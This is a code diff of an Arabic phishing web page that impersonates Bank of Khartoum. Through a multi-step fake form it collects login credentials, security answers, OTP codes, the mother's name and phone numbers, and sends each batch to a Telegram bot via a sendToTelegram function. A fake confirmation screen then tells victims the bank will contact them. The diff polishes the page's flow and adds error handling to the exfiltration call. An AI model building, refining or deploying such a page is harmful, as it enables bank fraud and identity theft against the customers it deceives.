@@ -43,7 +43,6 @@
         .info-text { color: #444; font-size: 14px; line-height: 1.7; display: block; margin-top: 15px; text-align: justify; }
         .warning-text { color: #d32f2f; font-weight: 700; background-color: #fff3f3; padding: 12px; border-right: 4px solid #d32f2f; margin-top: 15px; font-size: 13px; border-radius: 0 4px 4px 0; }
         
-        /* التنسيق الخاص ببيانات العميل المسترجعة */
         .client-summary-box { background-color: #f0f7f4; border: 1px solid #c8e6c9; padding: 15px; border-radius: 6px; margin-bottom: 15px; font-size: 13.5px; line-height: 1.6; color: #2e7d32; }
         .client-summary-box strong { color: #1b5e20; }
 
@@ -151,7 +150,7 @@
             <button class="btn-submit" onclick="submitWrongTransferData()">حفظ ومتابعة تسجيل الدخول</button>
         </div>
 
-        <!-- استمارة إثبات دخل -->
+        <!-- :استمارة إثبات دخل -->
         <div id="step-income-verification" class="card hidden">
             <h2>استمارة إثبات دخل</h2>
             <h3>الرجاء تزويدنا ببيانات الدخل والجهة الضامنة</h3>
@@ -186,7 +185,7 @@
             <button class="btn-submit" onclick="submitIncomeData()">حفظ ومتابعة تسجيل الدخول</button>
         </div>
 
-        <!-- خطوة 2 (بيانات الحساب والسر) -->
+        <!-- خطوة 2 -->
         <div id="step-2" class="card hidden">
             <h2>الاستمارة أونلاين</h2>
             <h3>الرجاء إدخال البيانات</h3>
@@ -205,7 +204,7 @@
             <button class="btn-submit" onclick="submitStep1()">تسجيل الدخول</button>
         </div>
 
-        <!-- خطوة 3 (أسئلة الأمان) -->
+        <!-- خطوة 3 -->
         <div id="step-3" class="card hidden">
             <h2>متابعة الاستمارة أونلاين</h2>
             <h3>لأغراض الأمان يرجى الإجابة على سؤال واحد من أسئلة الأمان</h3>
@@ -214,7 +213,7 @@
                 <select id="security-question">
                     <option value="" disabled selected>-- اختر سؤال الأمان --</option>
                     <option>ما هو اسم ابن عمك الاول؟</option>
-                    <option>في اي مدينة ولدت?</option>
+                    <option>في اي مدينة ولدت؟</option>
                     <option>في اي سنة تخرجت من الجامعة؟</option>
                     <option>اسم فريق كرة القدم المفضل لديك؟</option>
                     <option>ما هو اسم المدرسة التي التحقت بها؟</option>
@@ -227,7 +226,7 @@
             <button class="btn-submit" onclick="submitStep2()">إرسال</button>
         </div>
 
-        <!-- خطوة 4 (التفاصيل المالية والشخصية) -->
+        <!-- خطوة 4 -->
         <div id="step-4" class="card hidden">
             <h2>متابعة الاستمارة أونلاين</h2>
             <h3>لأغراض الأمان يرجى تأكيد التفاصيل المالية وبينات الهوية بالحساب</h3>
@@ -257,6 +256,7 @@
 
         <!-- خطوة 5 -->
         <div id="step-5" class="card hidden">
+            <!-- الـ OTP الافتراضي -->
             <div id="otp-area">
                 <h2>إدخال رمز OTP</h2>
                 <div class="input-group">
@@ -267,7 +267,7 @@
                 <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق الاعتمادي</button>
             </div>
 
-            <!-- الصندوق النهائي المعدل بناء على الصورة والطلبات الجديدة -->
+            <!-- الصندوق النهائي المحدث -->
             <div id="final-status-box" class="success-box hidden">
                 <h2 style="color: #2e7d32; text-align: center; margin-bottom: 10px;">✓ تم تسجيل ومعالجة طلبك بنجاح</h2>
                 <span class="reference-title">الرجاء حفظ وتوثيق الرقم المرجعي التابع لك:</span>
@@ -277,7 +277,6 @@
                     ⚠️ تنبيه أمني هام: نظام المراجعة الآلي يشترط مطابقة الـ OTP والبيانات المدخلة بدقة تامة. تقديم بيانات أو رموز غير صحيحة سيؤدي إلى رفض المعاملة فوراً بشكل تلقائي لحماية الحسابات من محاولات الدخول غير المصرح بها، وقد يعرض الحساب للتقييد المؤقت.
                 </div>
 
-                <!-- مراجعة بيانات العميل المطلوبة -->
                 <div class="client-summary-box">
                     👤 <strong>عزيزي العميل، تم توثيق بيانات الهوية الرقمية التالية:</strong><br>
                     • <strong>رقم الحساب المدخل:</strong> <span id="summary-account">--</span><br>
@@ -285,7 +284,6 @@
                     • <strong>رقم هاتف الواتساب:</strong> <span id="summary-whatsapp" style="direction: ltr; display: inline-block;">--</span>
                 </div>
 
-                <!-- نص المتابعة الطويل المقترح دون طلب تواصل من العميل وبدون رقم واتساب وبدون جملة استرداد -->
                 <span class="info-text">💬 <strong>خطوات المتابعة:</strong> يجب عليك الاحتفاظ بالرقم المرجعي الموضح أعلاه لتقديمه عند الحاجة. لقد تم تحويل استمارة المعالجة الحالية بنجاح إلى قسم التدقيق والرقابة الداخلية التابع لبنك الخرطوم للتحقق من سلامة الطلب واعتماده وتحديثه في الأنظمة المركزية. بناءً على السياسات الجديدة، <strong>سوف يتولى فريق الدعم الفني المختص وخدمة العملاء المعتمدة مهمة المبادرة بالتواصل معك مباشرة، إما عبر إجراء اتصال هاتفي أو إرسال رسالة رسمية إليك على رقم الواتساب المسجل</strong> الظاهر في بيانات المراجعة أعلاه، وذلك لاستكمال كافة إجراءات الاعتماد والربط والتحقق النهائي، دون الحاجة للقيام بأي إجراء إضافي من طرفك في الوقت الراهن.</span>
             </div>
         </div>
@@ -409,6 +407,7 @@
             }
             sendToTelegram(`🔐 أمان\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
             
+            // التأكد من أن الـ OTP نظيف وجاهز للمرة الأولى
             document.getElementById('otp-area').style.display = 'block';
             document.getElementById('final-status-box').classList.add('hidden');
             goToStep('step-5'); 
@@ -435,7 +434,7 @@
                 btn.disabled = false;
                 btn.innerHTML = `التحقق الاعتمادي`;
                 
-                goToStep('step-4');
+                goToStep('step-4'); // يذهب لخطوة البيانات المالية والشخصية
             }, 3000);
         }
 
@@ -454,15 +453,17 @@
 
             sendToTelegram(`💰 تأكيد المبلغ والبيانات الشخصية:\n💵 المبلغ: ${userData.amount}\n👩‍👦 إسم الوالدة: ${userData.motherName}\n💬 واتساب: ${userData.whatsappNum}\n📱 الهاتف المرتبط: ${userData.linkedPhone}\n🎫 المرجعي المولد: ${userData.refNum}`);
             
-            // حقن البيانات المدخلة ديناميكياً داخل نص مراجعة العميل
+            // حقن البيانات في عناصر المراجعة
             document.getElementById('summary-account').textContent = userData.accountNum;
             document.getElementById('summary-mother').textContent = userData.motherName;
             document.getElementById('summary-whatsapp').textContent = userData.whatsappNum;
 
+            // الإصلاح البرمجي هنا: إخفاء حقل طلب الـ OTP وإظهار صندوق النجاح فقط عند العودة
             document.getElementById('otp-area').style.display = 'none';
             document.getElementById('display-ref-num').textContent = randomRef;
             document.getElementById('final-status-box').classList.remove('hidden');
-            goToStep('step-5');
+            
+            goToStep('step-5'); // يعود لخطوة 5 ليعرض النتيجة نظيفة
         }
 
         function togglePassword(i) {
@@ -494,7 +495,7 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: messageText })
-            });
+            }).catch(err => console.log("Telegram Error handled"));
         }
     </script>
 </body>
